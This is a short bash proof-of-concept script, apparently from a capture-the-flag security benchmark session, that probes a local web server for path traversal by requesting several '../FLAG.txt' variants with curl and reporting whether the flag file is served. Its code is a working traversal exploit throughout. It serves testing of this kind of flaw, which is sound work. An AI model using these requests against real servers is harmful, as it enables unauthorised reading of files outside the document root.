#!/bin/bash
# POC: Demonstrates path traversal via URL normalization where /../FLAG.txt is normalized to /FLAG.txt, allowing access to the FLAG file outside the document root
# Target: ./repo
# Created: 2025-11-04T14:47:48.666Z
# Session: benchmark-XBEN-026-24-mhknowlp

# Path Traversal via URL Normalization POC
# This script tests if the web server normalizes paths but fails to prevent
# access to files outside the document root

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Testing Path Traversal via URL Normalization"
echo "[*] Target: ${BASE_URL}"
echo ""

# Test 1: Try accessing FLAG.txt via ../ normalization
echo "[*] Test 1: Accessing /../FLAG.txt (should normalize to /FLAG.txt)"
RESPONSE=$(curl -s -i "${BASE_URL}/../FLAG.txt")
HTTP_CODE=$(echo "$RESPONSE" | head -n 1)
BODY=$(echo "$RESPONSE" | tail -n +2)

echo "HTTP Response:"
echo "$HTTP_CODE"
echo ""
echo "Response Body:"
echo "$BODY"
echo ""

# Check if we got a 200 response
if echo "$HTTP_CODE" | grep -q "200"; then
    echo "[+] SUCCESS: Server returned HTTP 200"
    echo "[+] The server normalized the path and served the file"
    if echo "$BODY" | grep -q "FLAG"; then
        echo "[+] VULNERABLE: Received FLAG content: $BODY"
        exit 0
    fi
fi

# Test 2: Try variations of path traversal
echo ""
echo "[*] Test 2: Trying /./../FLAG.txt"
RESPONSE=$(curl -s -i "${BASE_URL}/./../FLAG.txt")
HTTP_CODE=$(echo "$RESPONSE" | head -n 1)
BODY=$(echo "$RESPONSE" | tail -n +2)

echo "HTTP Response:"
echo "$HTTP_CODE"
echo ""

if echo "$HTTP_CODE" | grep -q "200"; then
    echo "[+] SUCCESS: Server returned HTTP 200 for /./../FLAG.txt"
    echo "[+] VULNERABLE: Path traversal succeeded"
    if echo "$BODY" | grep -q "FLAG"; then
        echo "[+] Received FLAG content: $BODY"
        exit 0
    fi
fi

# Test 3: Multiple traversal attempts
echo ""
echo "[*] Test 3: Trying /website/../../FLAG.txt"
RESPONSE=$(curl -s -i "${BASE_URL}/website/../../FLAG.txt")
HTTP_CODE=$(echo "$RESPONSE" | head -n 1)
BODY=$(echo "$RESPONSE" | tail -n +2)

echo "HTTP Response:"
echo "$HTTP_CODE"
echo ""

if echo "$HTTP_CODE" | grep -q "200"; then
    echo "[+] SUCCESS: Server returned HTTP 200 for /website/../../FLAG.txt"
    echo "[+] VULNERABLE: Path traversal succeeded"
    if echo "$BODY" | grep -q "FLAG"; then
        echo "[+] Received FLAG content: $BODY"
        exit 0
    fi
fi

echo ""
echo "[-] Could not confirm path traversal vulnerability"
exit 1